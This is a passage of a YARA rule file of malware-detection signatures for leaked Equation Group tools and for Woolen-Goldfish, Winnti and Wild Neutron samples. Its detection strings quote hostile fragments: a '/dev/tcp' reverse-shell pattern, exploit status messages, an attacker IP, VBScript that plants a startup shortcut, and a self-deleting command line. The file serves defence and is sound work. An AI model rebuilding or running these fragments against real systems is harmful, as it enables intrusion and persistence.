( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DiBa_Target_BH {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "7ae9a247b60dc31f424e8a7a3b3f1749ba792ff1f4ba67ac65336220021fce9f"
strings:
$op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 }
$op1 = { 45 33 c9 49 8d 7f 2c 41 ba }
$op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 }
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052"
strings:
$x1 = "[-] Error appending shellcode buffer" fullword ascii
$x2 = "[-] Shellcode is too big" fullword ascii
$x3 = "[+] Exploit Payload Sent!" fullword ascii
$x4 = "[+] Bound to Dimsvc, sending exploit request to opnum 29" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}
rule SSC_EquationGroup_morerats_client_genkey {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89"
strings:
$x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')" fullword ascii
$x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii
condition:
( filesize < 3KB and all of them )
}
rule SSC_EquationGroup_morerats_client_noprep {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb"
strings:
$x1 = "storestr = 'echo -n \"%s\" | Store --nullterminate --file=\"%s\" --set=\"%s\"' % (nopenargs, outfile, VAR_NAME)" fullword ascii
$x2 = "The NOPEN-args provided are injected into infile if it is a valid" fullword ascii
$x3 = " -i                do not autokill after 5 hours" fullword ascii
condition:
( filesize < 9KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8"
hash2 = "237c22f4d43fdacfcbd6e1b5f1c71578279b7b06ea8e512b4b6b50f10e8ccf10"
hash3 = "79a584c127ac6a5e96f02a9c5288043ceb7445de2840b608fc99b55cf86507ed"
strings:
$x1 = "[-] Failed to Prepare Payload!" fullword ascii
$x2 = "ShellcodeStartOffset" fullword ascii
$x3 = "[*] Waiting for AuthCode from exploit" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_morerats_client_Store {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465"
strings:
$s1 = "[-] Failed to mmap file: %s" fullword ascii
$s2 = "[-] can not NULL terminate input data" fullword ascii
$s3 = "Missing argument for `-x'." fullword ascii
$s4 = "[!] Value has size of 0!" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 60KB and 2 of them )
}
rule SSC_EquationGroup_reverse_shell {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826"
strings:
$s1 = "sh >/dev/tcp/" ascii
$s2 = " <&1 2>&1" fullword ascii
condition:
( filesize < 1KB and all of them )
}
rule SSC_EquationGroup_cursezinger_linuxrh7_3_v_2_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135"
strings:
$s1 = ",%02d%03d" fullword ascii
$s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
$s3 = "__strtoll_internal" fullword ascii
$s4 = "__strtoul_internal" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_sshobo {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45"
strings:
$x1 = "Requested forwarding of port %d but user is not root." fullword ascii
$x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
$x3 = "~#  - list forwarded connections" fullword ascii
$x4 = "packet_inject_ignore: block" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 600KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Eternalromance {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
strings:
$x1 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii
$x2 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii
$x3 = "[-] Error: Backdoor not present on target" fullword ascii
$x4 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them
}
rule SSC_EquationGroup_seconddate_ImplantStandalone_3_0_3 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511"
strings:
$s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
$s2 = "G8HcJ HcF LcF0LcN" fullword ascii
$s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 1000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6"
strings:
$x1 = "[+] Connected to target %s:%d" fullword ascii
$x2 = "[-] build_exploit_run_x64():" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281"
strings:
$x1 = "[-] Touching the target failed!" fullword ascii
$x2 = "[-] OS fingerprint not complete - 0x%08x!" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "9ab667b7b5b9adf4ff1d6db6f804824a22c7cc003eb4208d5b2f12809f5e69d0"
hash2 = "320144a7842500a5b69ec16f81a9d1d4c8172bb92301afd07fb79bc0eca81557"
hash3 = "c10f4b9abee0fde50fe7c21b9948a2532744a53bb4c578630a81d2911f6105a3"
hash4 = "551174b9791fc5c1c6e379dac6110d0aba7277b450c2563e34581565609bc88e"
hash5 = "8419866c9058d738ebc1a18567fef52a3f12c47270f2e003b3e1242d86d62a46"
strings:
$s1 = "PQRAPAQSTUVWARASATAUAVAW" fullword ascii
$s2 = "SQRUWVAWAVAUATASARAQAP" fullword ascii
$s3 = "iijymqp" fullword ascii
$s4 = "AWAVAUATASARAQI" fullword ascii
$s5 = "WARASATAUAVM" fullword ascii
$op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc }
$op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 }
$op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 }
condition:
( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of ($s*) or all of ($op*) )
}
rule SSC_EquationGroup__scanner_scanner_v2_1_2 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
hash2 = "9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff"
strings:
$s1 = "Welcome to the network scanning tool" fullword ascii
$s2 = "Scanning port %d" fullword ascii
$s3 = "/current/down/cmdout/scans" fullword ascii
$s4 = "Scan for SSH version" fullword ascii
$s5 = "program vers proto   port  service" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
}
rule SSC_EquationGroup_cursesleepy_mswin32_v_1_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352"
strings:
$s1 = "A}%j,R" fullword ascii
$op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } /* Opcode */
$op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DUMPEL {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "bf42532be2d36f522dca7d3d3eb40b1d25c33d508a5a37c7e28f148945136dc6"
strings:
$x1 = "dumpel -f file [-s \\\\server]" fullword ascii
$x2 = "records will not appear in the dumped log." fullword ascii
$x3 = "obj\\i386\\Dumpel.exe" fullword ascii
$s13 = "DUMPEL Usage:    " fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_SetResourceName {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "537793d5158aecd0debae25416450bd885725adfc8ca53b0577a3df4b0222e2e"
strings:
$x1 = "Updates the name of the dll or executable in the resource file" fullword ascii
$x2 = "*NOTE: SetResourceName does not work with PeddleCheap versions" fullword ascii
$x3 = "2 = [appinit.dll] level4 dll" fullword ascii
$x4 = "1 = [spcss32.exe] level3 exe" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "3bee31b9edca8aa010a4684c2806b0ca988b2bcc14ad0964fec4f11f3f6fb748"
hash2 = "2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26"
strings:
$s4 = "* Failed to connect to destination - %u" fullword wide
$s6 = "* Failed to convert destination address into sockaddr_storage values" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them )
}
rule SSC_EquationGroup_x86_linux_exactchange {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
super_rule = 1
hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
strings:
$x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
$x2 = "[+] kernel stack size is %d" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 1000KB and 1 of them )
}
rule SSC_WoolenGoldfish_Generic_3
{
meta:
description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
author = "Florian Roth"
reference = "http://goo.gl/NpJpVZ"
date = "2015/03/25"
score = 90
hash1 = "86222ef166474e53f1eb6d7e6701713834e6fee7"
hash2 = "e8dbcde49c7f760165ebb0cb3452e4f1c24981f5"
strings:
$x1 = "... get header FATAL ERROR !!!  %d bytes read > header_size" fullword ascii
$x2 = "index.php?c=%S&r=%x&u=1&t=%S" fullword wide
$x3 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii
$s0 = "kernel32.dll GetProcAddressLoadLibraryAws2_32.dll" fullword ascii
$s1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
$s2 = "Attempting to unlock uninitialized lock!" fullword ascii
$s4 = "unable to load kernel32.dll" fullword ascii
$s5 = "index.php?c=%S&r=%x" fullword wide
$s6 = "%s len:%d " fullword ascii
$s7 = "Encountered error sending syscall response to client" fullword ascii
$s9 = "/info.dat" fullword ascii
$s10 = "Error entering thread lock" fullword ascii
$s11 = "Error exiting thread lock" fullword ascii
$s12 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii
condition:
( 1 of ($x*) ) or ( 8 of ($s*) )
}
rule SSC_WoolenGoldfish_Generic_2
{
meta:
description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
author = "Florian Roth"
reference = "http://goo.gl/NpJpVZ"
date = "2015/03/25"
score = 90
hash1 = "47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f"
hash2 = "62172eee1a4591bde2658175dd5b8652d5aead2a"
hash3 = "7fef48e1303e40110798dfec929ad88f1ad4fbd8"
hash4 = "c1edf6e3a271cf06030cc46cbd90074488c05564"
strings:
$s0 = "modules\\exploits\\littletools\\agent_wrapper\\release" ascii
condition:
all of them
}
rule SSC_WoolenGoldfish_Sample_1
{
meta:
description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
author = "Florian Roth"
reference = "http://goo.gl/NpJpVZ"
date = "2015/03/25"
score = 60
hash = "7ad0eb113bc575363a058f4bf21dbab8c8f7073a"
strings:
$s1 = "Cannot execute (%d)" fullword ascii
$s16 = "SvcName" fullword ascii
condition:
all of them
}
rule SSC_WoolenGoldfish_Generic_1
{
meta:
description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
author = "Florian Roth"
reference = "http://goo.gl/NpJpVZ"
date = "2015/03/25"
score = 90
super_rule = 1
hash0 = "5d334e0cb4ff58859e91f9e7f1c451ffdc7544c3"
hash1 = "d5b2b30fe2d4759c199e3659d561a50f88a7fb2e"
hash2 = "a42f1ad2360833baedd2d5f59354c4fc3820c475"
strings:
$x0 = "Users\\Wool3n.H4t\\"
$x1 = "C-CPP\\CWoolger"
$x2 = "NTSuser.exe" fullword wide
$s1 = "107.6.181.116" fullword wide
$s2 = "oShellLink.Hotkey = \"CTRL+SHIFT+F\"" fullword
$s3 = "set WshShell = WScript.CreateObject(\"WScript.Shell\")" fullword
$s4 = "oShellLink.IconLocation = \"notepad.exe, 0\"" fullword
$s5 = "set oShellLink = WshShell.CreateShortcut(strSTUP & \"\\WinDefender.lnk\")" fullword
$s6 = "wlg.dat" fullword
$s7 = "woolger" fullword wide
$s8 = "[Enter]" fullword
$s9 = "[Control]" fullword
condition:
( 1 of ($x*) and 2 of ($s*) ) or ( 6 of ($s*) )
}
rule SSC_Winnti_malware_UpdateDLL
{
meta:
description = "Detects a Winnti malware - Update.dll"
author = "Florian Roth"
reference = "VTI research"
date = "2015-10-10"
score = 75
hash1 = "1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016"
hash2 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
hash3 = "6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58"
hash4 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
strings:
$c1 = "'Wymajtec$Tima Stempijg Sarviges GA -$G2" fullword ascii
$c2 = "AHDNEAFE1.sys" fullword ascii
$c3 = "SOTEFEHJ3.sys" fullword ascii
$c4 = "MainSYS64.sys" fullword ascii
$s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
$s2 = "Update.dll" fullword ascii
$s3 = "\\\\.\\pipe\\usbpcex%d" fullword wide
$s4 = "\\\\.\\pipe\\usbpcg%d" fullword wide
$s5 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
$s6 = "\\??\\pipe\\usbpcg%d" fullword wide
$s7 = "\\??\\pipe\\usbpcex%d" fullword wide
$s8 = "HOST: %s" fullword ascii
$s9 = "$$$--Hello" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and ( ( 1 of ($c*) and 3 of ($s*) ) or all of ($s*) )
}
rule SSC_Winnti_signing_cert
{
meta:
description = "Detects a signing certificate used by the Winnti APT group"
author = "Florian Roth"
reference = "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/"
date = "2015-10-10"
score = 75
hash1 = "a9a8dc4ae77b1282f0c8bdebd2643458fc1ceb3145db4e30120dd81676ff9b61"
hash2 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
strings:
$s1 = "Guangzhou YuanLuo Technology Co." ascii
$s2 = "Guangzhou YuanLuo Technology Co.,Ltd" ascii
$s3 = "$Asahi Kasei Microdevices Corporation0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 700KB and 1 of them
}
rule SSC_Winnti_malware_StreamPortal_Gen
{
meta:
description = "Detects a Winnti malware - Streamportal"
author = "Florian Roth"
reference = "VTI research"
date = "2015-10-10"
score = 75
hash1 = "326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e"
hash2 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
hash3 = "aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f"
strings:
$s0 = "Proxies destination address/port for TCP" fullword wide
$s3 = "\\Device\\StreamPortal" fullword wide
$s4 = "Transport-Data Proxy Sub-Layer" fullword wide
$s5 = "Cookie: SN=" fullword ascii
$s6 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
$s17 = "NTOSKRNL.EXE" fullword wide /* Goodware String - occured 4 times */
$s19 = "FwpsReferenceNetBufferList0" fullword ascii /* Goodware String - occured 5 times */
condition:
uint16(0) == 0x5a4d and filesize < 275KB and all of them
}
rule SSC_Winnti_malware_FWPK
{
meta:
description = "Detects a Winnti malware - FWPKCLNT.SYS"
author = "Florian Roth"
reference = "VTI research"
date = "2015-10-10"
score = 75
hash1 = "1098518786c84b0d31f215122275582bdcd1666653ebc25d50a142b4f5dabf2c"
hash2 = "9a684ffad0e1c6a22db1bef2399f839d8eff53d7024fb014b9a5f714d11febd7"
hash3 = "a836397817071c35e24e94b2be3c2fa4ffa2eb1675d3db3b4456122ff4a71368"
strings:
$s0 = "\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\" fullword wide
$s1 = "%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u" fullword ascii
$s2 = "FWPKCLNT.SYS" fullword ascii
$s3 = "Port Layer" fullword wide
$s4 = "%x->%x, icmp type %d, code %d" fullword ascii
$s5 = "\\BaseNamedObjects\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}" fullword wide
$s6 = "\\Ndi\\Interfaces" fullword wide
$s7 = "\\Device\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}" fullword wide
$s8 = "Bad packet" fullword ascii
$s9 = "\\BaseNamedObjects\\EKV0000000000" fullword wide
$s10 = "%x->%x" fullword ascii
$s11 = "IPInjectPkt" fullword ascii /* Goodware String - occured 6 times */
condition:
uint16(0) == 0x5a4d and filesize < 642KB and all of them
}
rule SSC_Winnti_malware_Nsiproxy
{
meta:
description = "Detects a Winnti rootkit"
author = "Florian Roth"
date = "2015-10-10"
score = 75
hash1 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
hash2 = "cf1e006694b33f27d7c748bab35d0b0031a22d193622d47409b6725b395bffb0"
hash3 = "326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e"
hash4 = "aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f"
hash5 = "ba7ccd027fd2c826bbe8f2145d5131eff906150bd98fe25a10fbee2c984df1b8"
strings:
$x1 = "\\Driver\\nsiproxy" fullword wide
$a1 = "\\Device\\StreamPortal" fullword wide
$a2 = "\\Device\\PNTFILTER" fullword wide
$s1 = "Cookie: SN=" fullword ascii
$s2 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
$s3 = "Winqual.sys" fullword wide
$s4 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}" fullword wide
$s5 = "http://www.wasabii.com.tw 0" fullword ascii
condition:
uint16(0) == 0x5a4d and $x1 and 1 of ($a*) and 2 of ($s*)
}
rule SSC_WildNeutron_Sample_7
{
meta:
description = "Wild Neutron APT Sample Rule - file a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c"
strings:
$s0 = "checking match for '%s' user %s host %s addr %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00' */
$s1 = "PEM_read_bio_PrivateKey failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
$s2 = "usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]" fullword ascii /* score: '23.00' */
$s3 = "%s %s for %s%.100s from %.200s port %d%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
$s4 = "clapi32.dll" fullword ascii /* score: '21.00' */
$s5 = "Connection from %s port %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s6 = "/usr/etc/ssh_known_hosts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00' */
$s7 = "Version: %s - %s %s %s %s" fullword ascii /* score: '16.00' */
$s8 = "[-] connect()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.00' */
$s9 = "/bin/sh /usr/etc/sshrc" fullword ascii /* score: '12.42' */
$s10 = "kexecdhs.c" fullword ascii /* score: '12.00' */
$s11 = "%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s" fullword ascii /* score: '11.00' */
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}
rule SSC_WildNeutron_Sample_6
{
meta:
description = "Wild Neutron APT Sample Rule - file 4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865"
strings:
$s0 = "mshtaex.exe" fullword wide /* score: '20.00' */
condition:
uint16(0) == 0x5a4d and filesize < 310KB and all of them
}
rule SSC_WildNeutron_Sample_2
{
meta:
description = "Wild Neutron APT Sample Rule - file 8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f"
strings:
$s0 = "rundll32.exe \"%s\",#1" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
$s1 = "IgfxUpt.exe" fullword wide /* score: '20.00' */
$s2 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
$s3 = "Intel(R) Common User Interface" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s4 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
$s11 = "Key Usage" fullword ascii /* score: '12.00' */
$s12 = "Intel Integrated Graphics Updater" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00' */
$s13 = "%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */
condition:
uint16(0) == 0x5a4d and filesize < 600KB and all of them
}
rule SSC_WildNeutron_Sample_4
{
meta:
description = "Wild Neutron APT Sample Rule - file b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45"
strings:
$x1 = "WinRAT-Win32-Release.exe" fullword ascii /* score: '22.00' */
$s0 = "rundll32.exe \"%s\",#1" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
$s1 = "RtlUpd.EXE" fullword wide /* score: '20.00' */
$s2 = "RtlUpd.exe" fullword wide /* score: '20.00' */
$s3 = "Driver Update and remove for Windows x64 or x86_32" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s4 = "Realtek HD Audio Update and remove driver Tool" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
$s5 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
$s6 = "Key Usage" fullword ascii /* score: '12.00' */
$s7 = "id-at-serialNumber" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
condition:
uint16(0) == 0x5a4d and filesize < 1240KB and all of them
}
rule SSC_WildNeutron_Sample_10
{
meta:
description = "Wild Neutron APT Sample Rule - file 1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
date = "2015-07-10"
score = 60
hash = "1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7"
strings:
$n1 = "/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\notepad.exe > %s & del /f %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '46.00' */
$s1 = "%SYSTEMROOT%\\temp\\_dbg.tmp" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00' */
$s2 = "%SYSTEMROOT%\\SysWOW64\\mspool.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
$s3 = "%SYSTEMROOT%\\System32\\dpcore16t.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
$s4 = "%SYSTEMROOT%\\System32\\wdigestEx.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
$s5 = "%SYSTEMROOT%\\System32\\mspool.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
$s6 = "%SYSTEMROOT%\\System32\\kernel32.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
$s7 = "%SYSTEMROOT%\\SysWOW64\\iastor32.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
$s8 = "%SYSTEMROOT%\\System32\\msvcse.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
$s9 = "%SYSTEMROOT%\\System32\\mshtaex.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
